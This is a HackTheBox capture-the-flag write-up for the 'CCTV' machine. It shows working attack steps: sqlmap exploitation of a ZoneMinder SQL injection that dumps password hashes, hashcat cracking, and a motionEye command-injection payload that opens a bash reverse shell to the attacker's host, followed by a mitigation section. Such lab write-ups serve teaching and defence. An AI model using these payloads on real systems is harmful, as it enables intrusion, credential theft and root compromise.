---
title: CCTV
os: Linux
difficulty: Easy
tags:
  - SQL Injection
  - ZoneMinder
  - Hashcat
  - Chisel
  - motionEye
  - Command Injection
  - Privilege Escalation
  - CVE-2024-51428
  - CVE-2025-60787
date: 2026-03-13
---

# 🛡️ HTB - CCTV (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** CCTV
- **Operating System:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Date of Scan:** 2026-03-13
- **Vulnerabilities:** SQL Injection in ZoneMinder (CVE-2024-51428), OS Command Injection in motionEye (CVE-2025-60787)

---

## Step 1 - Reconnaissance

We start by running an Nmap scan to identify open ports and services:

```bash
nmap -A -sS -P -T4 --min-rate 5000 10.129.5.203
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-13 14:10 UTC
Nmap scan report for 10.129.5.203
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/13%OT=22%CT=1%CU=37963%PV=Y%DS=2%DC=T%G=Y%TM=69B4
OS:1B1E%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=104%TI=Z%CI=Z%TS=A)SEQ(SP
OS:=FD%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%
OS:O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   243.89 ms 10.10.14.1
2   237.41 ms 10.129.5.203

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.18 seconds
```

- 🔍 *Linux target system. ZoneMinder surveillance portal is running on port 80.*
- 🔍 *Typing the default credentials `admin:admin` grants access to the administrative dashboard.*
- 🔍 *The active ZoneMinder version is `v1.37.63`, which has known vulnerabilities.*

---

## Step 2 - Initial Foothold

- 🔍 *We test the authenticated SQL injection vulnerability (CVE-2024-51428) targeting the `tid` parameter with `sqlmap`:*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \
    -p tid --dbms=mysql --batch
```

```text
[*] starting @ 14:25:53 /2026-03-13/
[14:25:55] [INFO] testing connection to the target URL
[14:25:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:25:56] [INFO] testing if the target URL content is stable
[14:25:57] [INFO] target URL content is stable
[14:25:57] [WARNING] heuristic (basic) test shows that GET parameter 'tid' might not be injectable
[14:25:58] [INFO] testing for SQL injection on GET parameter 'tid'
[14:25:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:26:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:26:06] [INFO] testing 'Generic inline queries'
[14:26:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:26:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:26:08] [WARNING] time-based comparison requires larger statistical model, please wait.......... (done)
[14:26:24] [INFO] GET parameter 'tid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable

sqlmap identified the following injection point(s) with a total of 93 HTTP(s) requests:
---
Parameter: tid (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: view=request&request=event&action=removetag&tid=1 AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)
---
[14:27:08] [INFO] the back-end DBMS is MySQL
[14:27:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12
[14:27:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/cctv.htb'
```

- 🔍 *The parameter is confirmed vulnerable to time-based blind SQL injection.*

> [!IMPORTANT]
> **CVE-2024-51428 - ZoneMinder Authenticated SQL Injection:**
> ZoneMinder `v1.37.63` fails to properly sanitize the `tid` parameter within the `removetag` action of event requests. This lets authenticated users construct SQL payloads (e.g. `AND (SELECT 8298 FROM (SELECT(SLEEP(5)))NBiO)`) to extract data from the database.

- 🔍 *We dump the users table in the `zm` database using `sqlmap`:*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=i5ie78cg2qt7tsucl54kbbiu5r" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Username" --dump
```

```text
Database: zm
Table: Users
[3 entries]
+------------+
| Username   |
+------------+
| admin      |
| mark       |
| superadmin |
+------------+
```

- 🔍 *We request to dump password hashes for the target user `mark`:*

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=gl5bdpecie4ug6sb2bet115ovk" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Password" --where="Username='mark'" --dump
```

```text
Database: zm
Table: Users
[1 entry]
+-------------------------------------------------------------------------+
| Password                                                                |
+-------------------------------------------------------------------------+
| $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.            |
+-------------------------------------------------------------------------+
```

- 🔍 *We crack the bcrypt hash using Hashcat:*

```bash
hashcat -m 3200 mark_hash.txt /usr/share/wordlists/rockyou.txt
```

```text
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZ...XKfFG.
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Candidates.#1....: sunshine2 -> opensesame
Recovered........: 1/1 (100.00%) Digests (total)
```

- 🔍 *Bcrypt hash cracked: `opensesame`. We log in via SSH as user `mark`:*

```bash
ssh mark@cctv.htb
```

```text
mark@cctv.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
mark@cctv:~$ 
```

---

## Step 3 - Privilege Escalation

- 🔍 *We run system enumeration (e.g. linPEAS) and discover a local `motioneye` service instance running on port 8765:*

```text
tcp        0      0 127.0.0.1:8765          0.0.0.0:*               LISTEN 
motioneye.service                        loaded active running motionEye Server
 └─ RUNS_AS_ROOT: Service runs as root
```

- 🔍 *The service runs as root. Since port 8765 only binds to localhost, we tunnel it using `chisel`:*

```bash
# On the attack machine (start server):
./chisel-lin server --port 8099 --reverse --socks5

# On the target host (start client):
./chisel-lin client 10.10.14.67:8099 R:8765:127.0.0.1:8765
```

- 🔍 *We inspect the configurations in `/etc/motioneye`:*

```bash
cat /etc/motioneye/motion.conf
```

```ini
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password 

setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2
camera camera-1.conf
```

- 🔍 *We obtain the admin password hash: `989c5a8ee87a0e9521ec81a79187d162109282f0`. The motionEye application allows logging in by entering this raw SHA-1 hash directly into the password prompt.*
- 🔍 *Once authenticated, the dashboard interface reports version: `motionEye v0.43.1b4`.*

> [!WARNING]
> **CVE-2025-60787 - motionEye OS Command Injection:**
> motionEye version `v0.43.1b4` and before is vulnerable to command injection via the `image_file_name` configuration parameter. User configuration parameters are written directly to Motion backend files. When Motion restarts or processes actions, injected commands execute.

- 🔍 *The web page calls `configUiValid()` on the client side to block terminal special characters. We bypass this by opening the developer console (F12) and overriding the logic:*

```javascript
configUiValid = function() { return true; };
```

- 🔍 *We input our shell payload directly in the `Image File Name` parameter:*

```text
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/10.10.14.67/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

- 🔍 *We start a local listener and trigger the execution by requesting a snapshot:*

```bash
curl "http://127.0.0.1:8765/1/action/snapshot"
```

```text
Snapshot for camera 1 
Done
```

- 🔍 *We catch the root shell on our netcat listener:*

```bash
nc -lvnp 4444
```

```text
listening on [any] 4444 ...
connect to [10.10.14.67] from (UNKNOWN) [10.129.5.203] 36722
bash: cannot set terminal process group (3081): Inappropriate ioctl for device
bash: no job control in this shell
root@cctv:/etc/motioneye# whoami
root
```

- 🔍 *We retrieve flags from `/home/sa_mark` and `/root`:*

```bash
cat /home/sa_mark/user.txt
cat /root/root.txt
```

```text
User:  9a842fed************************
Root:  d3a8fc60************************
```

- 🔍 *Full Host Compromised.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Infrastructure & Application Security Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the CCTV environment. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Authenticated SQL Injection in ZoneMinder (CVE-2024-51428)

> [!WARNING]
> **Vulnerability Profile:**
> The ZoneMinder web application exposes an authenticated SQL Injection vulnerability on the `tid` parameter within the `removetag` action. 

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> SQL Injection allows attackers to query database schemas, bypass access controls, and dump password hashes of administrative users. By exploiting the time-based injection point, attackers can perform complete database dumping, leading directly to password cracking and lateral movement across SSH endpoints.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update ZoneMinder to the latest secure release (v1.37.64 or newer) where query parameters are fully parameterized.
> - **Remediation:** Implement server-side input validation/casting to guarantee the `tid` parameter only accepts strict integer types.
> - **Detection:** Deploy a Web Application Firewall (WAF) to detect common SQL injection signatures (e.g., `AND SLEEP()`, `UNION SELECT`) directed to index pages.

---

### 🔴 motionEye Configuration Command Injection (CVE-2025-60787)

> [!WARNING]
> **Vulnerability Profile:**
> The motionEye surveillance panel is vulnerable to OS Command Injection via the `image_file_name` configuration parameter, which is written directly into backend configuration files.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Because the `motioneye` service daemon runs under the high-privilege `root` user context, successful command injection leads to an immediate and complete system compromise. Attackers can execute arbitrary system commands, establish persistent reverse shells, and compromise host confidentiality and integrity.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update motionEye to a patched version that strips control characters (`$`, `(`, `)`, `;`, `&`) from configuration parameters.
> - **Remediation:** Enforce the principle of least privilege: configure the motionEye daemon to run under an unprivileged user context rather than `root`.
> - **Detection:** Use host intrusion detection systems (such as Sysmon or auditd) to monitor child processes spawned by web server daemons (e.g., python/motioneye launching `/bin/bash` or `/usr/bin/python3`).

---

### 🟡 Weak Password Controls and exposed SHA-1 Configuration Hashes

> [!WARNING]
> **Vulnerability Profile:**
> Local user credentials cracked easily via rockyou wordlist (opensesame). The motionEye admin password verification implementation allows using the raw SHA-1 hash instead of the plaintext password, bypassing hash protection mechanisms.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If an attacker obtains read access to `/etc/motioneye/motion.conf`, they can instantly log in to the motionEye web portal without needing to crack the SHA-1 hash. Combined with weak SSH credentials, attackers can pivot easily from web vulnerabilities to local system shells.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Adjust configuration file permissions so `/etc/motioneye/motion.conf` is strictly read-only by the service owner (e.g., `chmod 600`).
> - **Remediation:** Fix the password hashing verify logic in the application codebase to verify against plaintext passwords and prevent raw hash inputs from validating successfully.
